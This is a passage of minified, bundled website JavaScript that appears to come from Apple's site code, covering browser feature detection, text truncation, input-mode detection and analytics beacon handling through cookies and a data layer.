docStyle)&&(!isAndroidMobile||isAndroidMobile&&hasOnTransitionEnd),transitionEndName=usesModernTransition?"transitionend":"msTransition"in docStyle?"MSTransitionEnd":"WebkitTransition"in docStyle?"webkitTransitionEnd":null,animationEndName=usesModernTransition?"animationend":"msTransition"in docStyle?"MSAnimationEnd":"WebkitTransition"in docStyle?"webkitAnimationEnd":null;try{domTestSupport.style.height="100vh"}catch(e){}var vhHeight="100vh"===domTestSupport.style.height;try{domTestSupport.style.height=""}catch(e){}var support={cssPropertyName:cssPropertyName,cssPropertyValuePrefix:cssPropertyValuePrefix,inputPlaceholder:"placeholder"in input,maxlengthTextarea:"maxLength"in textarea,onInput:"oninput"in input,touch:!!("ontouchstart"in window)&&!isPhantom,overflowScrolling:cssSupport("overflowScrolling",!0),textOverflow:cssSupport("textOverflow",!0),transform:cssSupport("transform",!0),boxShadow:cssSupport("boxShadow",!0),opacity:cssSupport("opacity",!1),animation:cssSupport("animationName",!0),transition:cssSupport("transitionProperty",!0),transformProperty:cssPropertyName("transform"),positionSticky:null!==cssPropertyValuePrefix("position","sticky"),gradient:null!==cssPropertyValuePrefix("backgroundImage","linear-gradient(top, black, white)"),backgroundSvg:Boolean(document.createElementNS&&document.createElementNS("http://www.w3.org/2000/svg","svg").createSVGRect),threeDTransforms:threeDTransformsSupport(),supportsAR:supportsARFun(),webkitVersion:webkitVersion,iosVersion:iosVersion,ieVersion:ieVersion,androidVersion:androidVersion,os:os,vhHeight:vhHeight,transitionEndName:transitionEndName,animationEndName:animationEndName,isMobileIos:isMobileIos,isIpad:isIpad,isSafari:isSafari,isIe:isIe,isAndroidMobile:isAndroidMobile,isAndroidInternet:isAndroidInternet,isHandheldPhone:isHandheldPhone,rtl:!1,isMobileOptimized:!1};return supportCache=support,support};exports.setup=function setup(){var htm=document.documentElement,support=getSupportedFeatures();htm.classList.add(support.backgroundSvg?"svg":"no-svg"),htm.classList.add(support.touch?"touch":"no-touch"),htm.classList.add(support.isIe&&support.ieVersion>=9?"ie":"no-ie"),htm.classList.add(support.isIe&&support.ieVersion<9?"oldie":"no-oldie"),htm.classList.add(support.isMobileIos||support.isIpad?"ios":"no-ios"),htm.classList.add(support.animation?"supports-animation":"no-supports-animation"),htm.classList.add(cssSupport("columns",!0)?"supports-columns":"no-supports-columns"),htm.classList.add(cssSupport("backdropFilter",!0)?"supports-backdrop-filter":"no-supports-backdrop-filter"),htm.classList.add(support.isSafari&&support.supportsAR?"supports-ar":"no-supports-ar"),support.rtl="rtl"===window.getComputedStyle(document.body).direction}},{"../env/env.js":6}],17:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function telLinkReplacer(){var telLinkElems=Array.from(document.querySelectorAll("[data-tel-link].tel-link"));telLinkElems.length&&telLinkElems.forEach((function(el){var telHref=el.getAttribute("data-tel-link");telHref&&(el.setAttribute("data-tel-link",""),el.classList.remove("tel-link"),"A"===el.nodeName?(el.setAttribute("href","tel: ".concat(telHref)),el.classList.add("tel-link-replaced")):el.outerHTML="\n                    <a class=".concat("tel-link-replaced",' href="tel: ').concat(telHref,'">\n                        ').concat(el.outerHTML,"\n                    </a>\n                "))}))}},{}],18:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.truncateElementText=exports.truncateAll=exports.stop=exports.setup=exports.default=exports.attrTruncate=void 0;var _string=require("../string/string.js"),attrTruncate=exports.attrTruncate="data-as-truncate",handlerResize=null,handlerLoad=null,exceedsHeight=function exceedsHeight(el,maxHeight){return el.getBoundingClientRect().height>maxHeight},exceedsWidth=function exceedsWidth(el){var parent=el.parentElement;return!!parent&&parent.scrollWidth-1>parent.clientWidth},findNextBreakpoint=function findNextBreakpoint(text,start,end){var index=text.substring(start,end+1).search(/(\s|-)/);return index>-1?start+index:-1},truncateElementText=exports.truncateElementText=function truncateElementText(el){var maxLines=parseInt(el.getAttribute(attrTruncate)||"",10)||1,textAttr=el.getAttribute("title"),textContent=el.textContent||"",text=textAttr||textContent.replace(/\.\.\./g,"").trim();el.innerHTML=Array(maxLines).fill("i").join("<br/>");var maxHeight=el.getBoundingClientRect().height;textAttr||el.setAttribute("title",text),el.textContent=text;var hasManyWords=exceedsHeight(el,maxHeight),hasLongWord=exceedsWidth(el),canSplit=hasLongWord||el.matches(":lang(zh), :lang(jp)");if(hasLongWord||hasManyWords){for(var lo=0,hi=text.length;hi>lo;){var mid=Math.ceil((lo+hi)/2),nextBreak=findNextBreakpoint(text,mid,hi),length=nextBreak>-1?nextBreak:canSplit?mid:-1;length>-1&&(el.textContent=(0,_string.truncate)(text,{length:length}));var hasOverflow=length<0||exceedsWidth(el)||exceedsHeight(el,maxHeight);hi=hasOverflow?mid-1:hi,lo=hasOverflow?lo:mid}el.textContent=(0,_string.truncate)(text,{length:lo})}else el.removeAttribute("title")},truncateAll=exports.truncateAll=function truncateAll(){var els=(arguments.length>0&&void 0!==arguments[0]?arguments[0]:document.body).querySelectorAll("[".concat(attrTruncate,"]"));Array.from(els).forEach((function(el){return truncateElementText(el)}))},stop=(exports.setup=function setup(){var container=arguments.length>0&&void 0!==arguments[0]?arguments[0]:document.body;stop();var handlerBound=function handlerBound(){truncateAll(container)},resizeTimer=-1;handlerLoad=handlerBound,handlerResize=function handlerResize(){window.clearTimeout(resizeTimer),resizeTimer=window.setTimeout(handlerBound,100)},window.addEventListener("load",handlerLoad),window.addEventListener("resize",handlerResize),handlerBound()},exports.stop=function stop(){handlerLoad&&(window.removeEventListener("load",handlerLoad),handlerLoad=null),handlerResize&&(window.removeEventListener("resize",handlerResize),handlerResize=null)});exports.default=truncateElementText},{"../string/string.js":15}],19:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.stop=exports.setup=exports.isKeyboardType=exports.classIsMouse=exports.classIsKeyboard=void 0;var _event=require("../event/event.js"),classIsMouse=exports.classIsMouse="as-mouseuser",classIsKeyboard=exports.classIsKeyboard="as-keyboarduser",keyList=[_event.keys.Tab,_event.keys.Esc,_event.keys.Alt,_event.keys.Ctrl,_event.keys.ArrowDown,_event.keys.ArrowLeft,_event.keys.ArrowRight,_event.keys.ArrowUp],domMain=null,isMouse=!1,isKeyboard=!1,isSetup=!1,updateClasses=function updateClasses(){domMain&&(domMain.classList.toggle(classIsMouse,isMouse),domMain.classList.toggle(classIsKeyboard,isKeyboard))},handleMouse=function handleMouse(){isMouse||(isMouse=!0,isKeyboard=!1,updateClasses())},handleKey=function handleKey(ev){!isKeyboard&&keyList.indexOf(ev.keyCode)>-1&&(isMouse=!1,isKeyboard=!0,updateClasses())};exports.setup=function setup(){var target=arguments.length>0&&void 0!==arguments[0]?arguments[0]:document.documentElement;domMain=target,isSetup||(handleMouse(),document.addEventListener("mousedown",handleMouse),document.addEventListener("keyup",handleKey),isSetup=!0)},exports.stop=function stop(){document.removeEventListener("mousedown",handleMouse),document.removeEventListener("keyup",handleKey),isSetup=!1},exports.isKeyboardType=function isKeyboardType(){return(domMain||document.documentElement).classList.contains(classIsKeyboard)}},{"../event/event.js":7}],20:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.vars=exports.varOverheadLength=exports.uidPropName=exports.maxPropLength=exports.maxEventsLength=exports.maxEvarLength=exports.dataLayerPath=exports.cookieOpts=exports.cookieName=exports.beaconMaxLength=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_analyticsDataLayer=require("@apple/analytics-data-layer"),_analyticsOmnitureConstants=require("@apple/analytics-omniture-constants"),_index=require("./sanitizers/index.js"),maxEvarLength=(exports.beaconMaxLength=500,exports.varOverheadLength=6,exports.maxEvarLength=250),maxPropLength=exports.maxPropLength=100,maxEventsLength=exports.maxEventsLength=150,uidPropName=(exports.cookieName="mk_epub",exports.cookieOpts={path:"/",secure:!0},exports.dataLayerPath=[_analyticsDataLayer.KEYS.PERSISTED,_analyticsDataLayer.KEYS.DEFERRED_BEACON],exports.uidPropName="btuid");exports.vars=[{name:uidPropName,sanitizers:[_analyticsUtils.beaconHelpers.toBeaconSafeVal,(0,_index.lengthLimitFactory)(7)]},{name:_analyticsOmnitureConstants.VARS.EVENTS,sanitizers:[_analyticsUtils.beaconHelpers.toBeaconSafeVal,(0,_index.lengthLimitFactory)(maxEventsLength)]},{name:_analyticsOmnitureConstants.VARS.EVAR_1,sanitizers:[_analyticsUtils.beaconHelpers.toBeaconSafeVal,(0,_index.lengthLimitFactory)(maxEvarLength)]},{name:_analyticsOmnitureConstants.VARS.PROP_14,sanitizers:[_analyticsUtils.beaconHelpers.toBeaconSafeVal,(0,_index.lengthLimitFactory)(maxPropLength)]},{name:_analyticsOmnitureConstants.VARS.PROP_57,sanitizers:[_analyticsUtils.beaconHelpers.toBeaconSafeVal,(0,_index.lengthLimitFactory)(maxPropLength)]},{name:_analyticsOmnitureConstants.VARS.PROP_7,sanitizers:[_analyticsUtils.beaconHelpers.toBeaconSafeVal,(0,_index.lengthLimitFactory)(maxPropLength)]},{name:_analyticsOmnitureConstants.VARS.EVAR_15,sanitizers:[_analyticsUtils.beaconHelpers.toBeaconSafeVal,(0,_index.lengthLimitFactory)(maxEvarLength)]},{name:_analyticsOmnitureConstants.VARS.EVAR_23,sanitizers:[_analyticsUtils.beaconHelpers.toBeaconSafeVal,(0,_index.lengthLimitFactory)(maxEvarLength)]},{name:_analyticsOmnitureConstants.VARS.PROP_25,sanitizers:[_analyticsUtils.beaconHelpers.toBeaconSafeVal,(0,_index.lengthLimitFactory)(maxPropLength)]},{name:_analyticsOmnitureConstants.VARS.EVAR_2,sanitizers:[_analyticsUtils.beaconHelpers.toBeaconSafeVal,(0,_index.lengthLimitFactory)(maxEvarLength)]},{name:"pj",sanitizers:[(0,_index.lengthLimitFactory)(100)]}]},{"./sanitizers/index.js":32,"@apple/analytics-data-layer":46,"@apple/analytics-omniture-constants":115,"@apple/analytics-utils":190}],21:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.set=exports.get=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_getCookieDomain=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./getCookieDomain.js")),_config=require("./config.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}exports.get=function get(){var deferredBeacon=_analyticsUtils.cookieJson.get(_config.cookieName);return _analyticsUtils.cookieJson.set(_config.cookieName,null,_objectSpread(_objectSpread({},_config.cookieOpts),{},{domain:(0,_getCookieDomain.default)()})),deferredBeacon},exports.set=function set(deferredBeacon){_analyticsUtils.beaconHelpers.isNotEmpty(deferredBeacon)&&_analyticsUtils.cookieJson.set(_config.cookieName,deferredBeacon,_objectSpread(_objectSpread({},_config.cookieOpts),{},{domain:(0,_getCookieDomain.default)()}))}},{"./config.js":20,"./getCookieDomain.js":26,"@apple/analytics-utils":190}],22:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.get=void 0;var _analyticsUtils=require("@apple/analytics-utils"),dataLayer=function _interopRequireWildcard(e,r){if(!r&&e&&e.__esModule)return e;if(null===e||"object"!=_typeof(e)&&"function"!=typeof e)return{default:e};var t=_getRequireWildcardCache(r);if(t&&t.has(e))return t.get(e);var n={__proto__:null},a=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var u in e)if("default"!==u&&Object.prototype.hasOwnProperty.call(e,u)){var i=a?Object.getOwnPropertyDescriptor(e,u):null;i&&(i.get||i.set)?Object.defineProperty(n,u,i):n[u]=e[u]}return n.default=e,t&&t.set(e,n),n}(require("@apple/analytics-data-layer")),_config=require("../config.js"),_getUid=require("./getUid.js");function _getRequireWildcardCache(e){if("function"!=typeof WeakMap)return null;var r=new WeakMap,t=new WeakMap;return(_getRequireWildcardCache=function _getRequireWildcardCache(e){return e?t:r})(e)}exports.get=function get(){var deferredBeacon=dataLayer.get(_config.dataLayerPath);return _analyticsUtils.beaconHelpers.isNotEmpty(deferredBeacon)&&(deferredBeacon[_config.uidPropName]=(0,_getUid.getUid)(),dataLayer.set(_config.dataLayerPath,deferredBeacon)),deferredBeacon}},{"../config.js":20,"./getUid.js":23,"@apple/analytics-data-layer":46,"@apple/analytics-utils":190}],23:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.getUid=void 0;exports.getUid=function getUid(){return window.crypto.getRandomValues(new Uint32Array(1))[0].toString(36)}},{}],24:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"get",{enumerable:!0,get:function get(){return _get.get}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _set.set}});var _get=require("./get.js"),_set=require("./set.js")},{"./get.js":22,"./set.js":25}],25:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.set=void 0;var _analyticsUtils=require("@apple/analytics-utils"),dataLayer=function _interopRequireWildcard(e,r){if(!r&&e&&e.__esModule)return e;if(null===e||"object"!=_typeof(e)&&"function"!=typeof e)return{default:e};var t=_getRequireWildcardCache(r);if(t&&t.has(e))return t.get(e);var n={__proto__:null},a=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var u in e)if("default"!==u&&Object.prototype.hasOwnProperty.call(e,u)){var i=a?Object.getOwnPropertyDescriptor(e,u):null;i&&(i.get||i.set)?Object.defineProperty(n,u,i):n[u]=e[u]}return n.default=e,t&&t.set(e,n),n}(require("@apple/analytics-data-layer")),_config=require("../config.js");function _getRequireWildcardCache(e){if("function"!=typeof WeakMap)return null;var r=new WeakMap,t=new WeakMap;return(_getRequireWildcardCache=function _getRequireWildcardCache(e){return e?t:r})(e)}function _toConsumableArray(arr){return function _arrayWithoutHoles(arr){if(Array.isArray(arr))return _arrayLikeToArray(arr)}(arr)||function _iterableToArray(iter){if("undefined"!=typeof Symbol&&null!=iter[Symbol.iterator]||null!=iter["@@iterator"])return Array.from(iter)}(arr)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr)||function _nonIterableSpread(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}exports.set=function set(newDeferredBeacon){var currentDeferredBeacon=dataLayer.get(_config.dataLayerPath);!_analyticsUtils.beaconHelpers.isNotEmpty(newDeferredBeacon)||_analyticsUtils.beaconHelpers.isNotEmpty(currentDeferredBeacon)&&newDeferredBeacon[_config.uidPropName]===currentDeferredBeacon[_config.uidPropName]||dataLayer.set(_config.dataLayerPath,newDeferredBeacon),dataLayer.remove([].concat(_toConsumableArray(_config.dataLayerPath),[_config.uidPropName]))}},{"../config.js":20,"@apple/analytics-data-layer":46,"@apple/analytics-utils":190}],26:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsDataLayer=require("@apple/analytics-data-layer");function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}var cookieDomainKey=[].concat(function _toConsumableArray(arr){return function _arrayWithoutHoles(arr){if(Array.isArray(arr))return _arrayLikeToArray(arr)}(arr)||function _iterableToArray(iter){if("undefined"!=typeof Symbol&&null!=iter[Symbol.iterator]||null!=iter["@@iterator"])return Array.from(iter)}(arr)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr)||function _nonIterableSpread(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}(_analyticsDataLayer.KEYS.PATHS.CONFIG),["global","cookieDomain"]);exports.default=function getCookieDomain(){return(0,_analyticsDataLayer.get)(cookieDomainKey)}},{"@apple/analytics-data-layer":46}],27:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"retrieve",{enumerable:!0,get:function get(){return _retrieve.default}}),Object.defineProperty(exports,"store",{enumerable:!0,get:function get(){return _store.default}});var _retrieve=_interopRequireDefault(require("./retrieve.js")),_store=_interopRequireDefault(require("./store.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./retrieve.js":28,"./store.js":34}],28:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_index=require("./dataLayer/index.js"),_cookie=require("./cookie.js"),retrieve=(0,_analyticsUtils.pipe)(_cookie.get,_index.set);exports.default=retrieve},{"./cookie.js":21,"./dataLayer/index.js":24,"@apple/analytics-utils":190}],29:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_sanitizeBeaconVars=_interopRequireDefault(require("./sanitizeBeaconVars.js")),_sanitizeBeaconLength=_interopRequireDefault(require("./sanitizeBeaconLength.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}var sanitizeBeacon=(0,_analyticsUtils.pipe)(_sanitizeBeaconVars.default,_sanitizeBeaconLength.default);exports.default=sanitizeBeacon},{"./sanitizeBeaconLength.js":30,"./sanitizeBeaconVars.js":31,"@apple/analytics-utils":190}],30:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_config=require("./config.js");exports.default=function sanitizeBeaconLength(originalBeacon){return _analyticsUtils.beaconHelpers.isNotEmpty(originalBeacon)?_config.vars.reduce((function(_ref,variable){var beacon=_ref.beacon,beaconLength=_ref.beaconLength,varName=variable.name,varValue=(0,_analyticsUtils.toStr)(originalBeacon[varName]),varLength=varName.length+varValue.length+_config.varOverheadLength;return varValue&&beaconLength+varLength<=_config.beaconMaxLength?(beacon[varName]=varValue,{beacon:beacon,beaconLength:beaconLength+varLength}):{beacon:beacon,beaconLength:beaconLength}}),{beacon:{},beaconLength:0}).beacon:null}},{"./config.js":20,"@apple/analytics-utils":190}],31:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_config=require("./config.js");function _toConsumableArray(arr){return function _arrayWithoutHoles(arr){if(Array.isArray(arr))return _arrayLikeToArray(arr)}(arr)||function _iterableToArray(iter){if("undefined"!=typeof Symbol&&null!=iter[Symbol.iterator]||null!=iter["@@iterator"])return Array.from(iter)}(arr)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr)||function _nonIterableSpread(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}exports.default=function sanitizeBeaconVars(beacon){return _analyticsUtils.beaconHelpers.isNotEmpty(beacon)?_config.vars.reduce((function(sanitizedBeacon,variable){var sanitizers=variable.sanitizers||[],sanitizedValue=_analyticsUtils.pipe.apply(void 0,_toConsumableArray(sanitizers))(beacon[variable.name]);return sanitizedValue&&(sanitizedBeacon[variable.name]=sanitizedValue),sanitizedBeacon}),{}):null}},{"./config.js":20,"@apple/analytics-utils":190}],32:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"lengthLimitFactory",{enumerable:!0,get:function get(){return _lengthLimitFactory.default}});var _lengthLimitFactory=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./lengthLimitFactory.js"))},{"./lengthLimitFactory.js":33}],33:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function lengthLimitFactory(maxLength){return function(str){return"string"==typeof str?str.slice(0,maxLength):null}}},{}],34:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_index=require("./dataLayer/index.js"),_sanitizeBeacon=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./sanitizeBeacon.js")),_cookie=require("./cookie.js");var store=(0,_analyticsUtils.pipe)(_index.get,_sanitizeBeacon.default,_cookie.set);exports.default=store},{"./cookie.js":21,"./dataLayer/index.js":24,"./sanitizeBeacon.js":29,"@apple/analytics-utils":190}],35:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"passiveTrackerLoader",{enumerable:!0,get:function get(){return _passiveTrackerLoader.passiveTrackerLoader}});var _passiveTrackerLoader=require("./passiveTrackerLoader.js")},{"./passiveTrackerLoader.js":36}],36:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.passiveTrackerLoader=void 0;var _analyticsMergeBeacons=require("@apple/analytics-merge-beacons"),_analyticsPassiveTrackerLoaders=require("@apple/analytics-passive-tracker-loaders"),types={pageLoad:"page",userInteraction:"next"};(exports.passiveTrackerLoader=function passiveTrackerLoader(data){var type=data.type,globalTracking=data.globalTracking,element=data.element;if(!Object.keys(types).includes(type)||globalTracking&&function isModalOrJavaScriptLink(element){if(!element)return!1;var linkEl=element.closest("a");return null!==linkEl&&!(!linkEl.dataset.aseLoader&&!linkEl.dataset.aseTabsLoader&&"#"!==linkEl.getAttribute("href"))}(element)||data.deferred&&!0===data.deferred)return data;var loadersBeacon=(0,_analyticsPassiveTrackerLoaders.loaders)(types[type]);return null!==loadersBeacon&&(data.beacon=(0,_analyticsMergeBeacons.merge)({target:data.beacon,source:loadersBeacon})),data}).label="analytics-bp-passive-tracker-loader"},{"@apple/analytics-merge-beacons":94,"@apple/analytics-passive-tracker-loaders":116}],37:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.SESSION_STORE=exports.RELAY=exports.REFERRER=exports.PURCHASE_JOURNEY=exports.PERSISTED=exports.PATHS=exports.PAGE_LOAD=exports.PAGE_DATA_MODEL_LEGACY=exports.PAGE_DATA_MODEL=exports.METADATA=exports.DEFERRED_BEACON=exports.CLICK_TIMER=void 0;exports.METADATA="metaData";var PAGE_DATA_MODEL=exports.PAGE_DATA_MODEL="pageDataModel",PERSISTED=(exports.PAGE_DATA_MODEL_LEGACY="pageDataModel.data.properties",exports.PERSISTED="persisted"),DEFERRED_BEACON=(exports.SESSION_STORE="sessionStore",exports.DEFERRED_BEACON="deferredBeacon");exports.PAGE_LOAD="pageLoad",exports.PURCHASE_JOURNEY="purchaseJourney",exports.CLICK_TIMER="clickTimer",exports.RELAY="relay",exports.REFERRER="referrer",exports.PATHS={CONFIG:[PAGE_DATA_MODEL,"config"],PAGE_DATA:[PAGE_DATA_MODEL,"data"],DEFERRED_BEACON:[PERSISTED,DEFERRED_BEACON]}},{}],38:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default={}},{}],39:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"config",{enumerable:!0,get:function get(){return _config.default}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _set.default}});var _config=_interopRequireDefault(require("./config.js")),_set=_interopRequireDefault(require("./set.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./config.js":38,"./set.js":41}],40:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default={pageDataModel:["key","selector"],meta:["key","selector","keyAttribute","valueAttribute"],state:["defaultState"],persisted:["key"],sessionStore:["key"]}},{}],41:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=require("../utils/index.js"),_mandatoryProps=_interopRequireDefault(require("./mandatoryProps.js")),_config2=_interopRequireDefault(require("./config.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}exports.default=function set(_config){(0,_index.isObject)(_config)&&Object.keys(_mandatoryProps.default).forEach((function(propName){(0,_index.isValidObject)(_config[propName],_mandatoryProps.default[propName])&&(_config2.default[propName]=function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}({},_config[propName]))}))}},{"../utils/index.js":70,"./config.js":38,"./mandatoryProps.js":40}],42:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_state=require("./state.js");exports.default=function get(path){return path?(0,_state.get)(_analyticsUtils.objectPath.formatPath(path)):(0,_state.get)()}},{"./state.js":69,"@apple/analytics-utils":190}],43:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=require("../localStoreSync/index.js"),_index2=require("../sessionStoreSync/index.js"),_state=require("../state.js"),_index3=require("../config/index.js"),_readMeta=_interopRequireDefault(require("./readMeta.js")),_readPageDataModel=_interopRequireDefault(require("./readPageDataModel.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}exports.default=function hydrate(){(0,_state.reset)(_index3.config.state&&_index3.config.state.defaultState),(0,_readMeta.default)(),(0,_readPageDataModel.default)(),(0,_index.syncLocalStoreToState)(),(0,_index2.syncSessionStoreToState)()}},{"../config/index.js":39,"../localStoreSync/index.js":56,"../sessionStoreSync/index.js":65,"../state.js":69,"./readMeta.js":44,"./readPageDataModel.js":45}],44:[function(require,module,exports){"use 